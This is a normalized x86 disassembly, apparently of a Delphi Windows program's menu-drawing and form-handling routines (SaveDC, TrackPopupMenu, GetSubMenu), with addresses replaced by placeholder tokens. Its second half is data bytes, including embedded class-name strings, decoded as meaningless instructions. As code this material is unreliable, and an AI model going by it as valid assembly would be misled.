jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44b5e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44b5c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41e984
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e824
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44ba58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b5d0
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e984
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_44ae70
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_44a570
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44a570
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_44b729
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e2d4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_44b704
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_44b6e7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41e984
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41e824
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b6ee
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41e984
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_434910
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457648
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44a570
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44a570
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44a570
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44a5a0
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414170
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44a5a0
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4572ec
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_457354
jmp r-xdata
sub_44b70b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44b7c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_414014
pop esi
pop ebx
retn
push ebx
push sub_44b234
call sub_41ba90
mov [ ebx + 0x10 ] eax
sub_44b808
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44a388
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44b7c4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_44b87c
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44b7ec
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44a424
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_44b8d4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_446720
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44b090
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44b090
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44b91c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_446720
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455e98
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403490
mov edx eax
jmp r-xdata
sub_44b968
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412ce0
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44b8d4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_449cdc
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44a1d8
mov eax [ ebx + 0x34 ]
call sub_447580
mov eax ebx
call sub_44ab80
mov eax ebx
call sub_44b91c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_4476b0
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44ba1c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414170
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_414170
cmp ebp [ eax ]
jne r-xdata
sub_44ba58
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41e184
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41d9b8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41e184
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41d9b8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403490
mov edx [ r-xdata ]
call sub_403420
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41e184
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41d9b8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44bb40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040a4
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404310
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4045b0
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404310
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4045b0
jmp r-xdata
sub_44bbd4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404050
mov ebx 0x1
mov eax esi
call sub_404310
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404238
sub_44bc38
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44bc91
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44bb40
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44bb40
mov eax [ ebp - 0x8 ]
pop edx
call sub_407ddc
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bc98
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
sub_44bd0d
mov [ edi ] es
cld
popfd
inc edi
add al dh
mov [ edi ] es
mov eax 0xec00479d
mov [ edi ] es
and [ ecx - 0x7317ffb9 ] bl
inc edi
add [ eax ] bh
cdq
inc edi
add ah ah
mov [ edi ] es
mov esp 0x55004799
mov ebp esp
xor eax eax
push ebp
push sub_44bd98
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bd9f
retn
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax [ rw-data ]
call sub_403294
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404acc
mov eax rw-data
call sub_404050
sub_44bda4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d78
mov eax [ r-xdata ]
call sub_4139ac
mov eax [ r-xdata ]
call sub_413a4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
mov eax [ r-xdata ]
call sub_4138bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423504
mov [ rw-data ] eax
sub_44bed0
add [ eax ] al
add bh bh
shr al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dl
jmp r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
add al 0xe9
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov al [ ebx ]
lea edx [ ebp - 0x4 ]
call sub_407f48
push [ ebp - 0x4 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x1 ]
lea edx [ ebp - 0x8 ]
call sub_407f48
push [ ebp - 0x8 ]
push r-xdata
xor eax eax
mov al [ ebx + 0x2 ]
lea edx [ ebp - 0xc ]
call sub_407f48
push [ ebp - 0xc ]
push r-xdata
xor eax eax
mov al [ ebx + 0x3 ]
lea edx [ ebp - 0x10 ]
call sub_407f48
push [ ebp - 0x10 ]
mov eax esi
mov edx 0x7
call sub_4043d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c0bf
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404074
retn
inc eax
add [ eax + eax ] cl
add bh bh
cmp cl ch
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
mov esi 0x80044
add bh bh
or [ eax ] al
add bh bh
fsub st1
inc esp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
sar [ edi + edi * 4 ] 0x44
add [ eax ] al
je r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
inc [ eax - 0x16 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
pop eax
0x10044 0x0
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
mov dl ch
inc esp
add [ edx + ebp * 8 + 0x44 ] bl
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
inc eax
call sub_45bfb3
mov edi 0x1c6c0044
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
jmp [ eax ]
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
cmp al 0xbf
inc esp
jae r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
cld
jmp r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi * 4 ] ah
inc esp
add [ eax ] cl
add [ eax ] al
clc
sbb eax [ ecx ]
les esi [ eax + eax * 2 ]
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x47 ] al
inc ecx
add [ eax + 0x48 ] dl
inc ecx
add [ eax + 0x48 ] bl
inc ecx
add al ah
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xbf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edi 0x44
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebp * 8 + 0x44 ] cl
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] ah
rol [ eax + eax + 0x8 ] 0x77
jae r-xdata
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
clc
in eax dx
inc esp
add [ eax - 0x23ffbb10 ] ch
inc esp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
jmp eax
add [ eax + 0x78 ] al
inc ebx
add [ eax - 0x3fffbc47 ] al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
add al 0xf4
cmp eax [ ebx ]
mov ah 0xb0
inc ecx
outsd
jb r-xdata
add [ eax - 0x16 ] al
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
jl r-xdata
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc esp
add al bl
in eax dx
inc esp
add [ esp + esi * 4 ] cl
inc ebx
add [ eax - 0xbffbb13 ] cl
mov al 0x43
add [ eax - 0x5bffbb13 ] bl
mov ah 0x43
add [ eax + 0x600043b4 ] ch
mov bl 0x43
add [ eax ] cl
mov bl 0x43
inc ebx
add [ esi + ebx * 8 + 0x43 ] bl
add [ eax - 0x27 ] bl
inc ebx
add [ eax - 0x22 ] al
inc ebx
add [ esp + esi * 8 ] al
inc ebx
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add ah dl
in al dx
inc esp
add [ ebp + 0x43 ] dl
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
test al 0xea
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ecx + eax * 8 ] ah
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ ecx + eax * 8 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
retn 0x44
sub_44c297
inc esp
add [ ebx + esi * 8 - 0xc1fffbc ] bh
inc esp
add [ esp + esi * 8 + 0x44 ] dh
add [ eax + 0x180044f2 ] bh
out dx al
inc esp
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
push esi
outsd
insb
nop
enter 0x44c2 0x0
pop es
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
outsd
imul ebp [ eax ] 0x29
inc ecx
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
mov ah 0xc1
inc esp
add ah bh
inc ebx
add [ 0x6f460500 ] cl
jb r-xdata
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x44c3e0c0 ]
outsd
or al 0x62
retn
jb r-xdata
je r-xdata
add [ 0x40000000 ] al
retn
jae r-xdata
insd
sub al 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
add [ edi ] cl
or [ ecx + 0x4f ] cl
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
outsd
jae r-xdata
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
insb
mov edi 0x2080044
add bh bh
nop
out dx eax
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ eax ] bh
outsd
jb r-xdata
inc eax
add [ eax - 0x3c ] ah
inc esp
add [ ebx ] al
add [ ebx ] al
add [ eax ] al
add [ esp + eax * 8 + 0x44 ] bl
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
adc [ eax ] eax
add ecx eax
loope r-xdata
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
outsb
jne r-xdata
push ebx
je r-xdata
add [ gs : eax ] eax
add [ eax ] al
retn
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push eax
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
jb r-xdata
dec [ ebp - 0x3befffc0 ]
inc esp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
add bh bh
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
int 0xda
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esp + eax * 8 ] cl
inc esp
add [ eax ] cl
jae r-xdata
push ebx
jb r-xdata
mov edi 0x20c0044
add bh bh
mov al [ 0x10044ef ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add ah al
les eax [ eax + eax + 0xa ]
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
mov al 0xc4
inc esi
outsd
jb r-xdata
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pushad
lds eax [ eax + eax + 0x9 ]
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
lds eax [ eax + eax + 0x6 ]
inc eax
add [ eax - 0x3a ] cl
inc esp
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
je r-xdata
lds eax [ eax + eax + 0x3 ]
or edx [ eax + edx * 2 + 0x72 ]
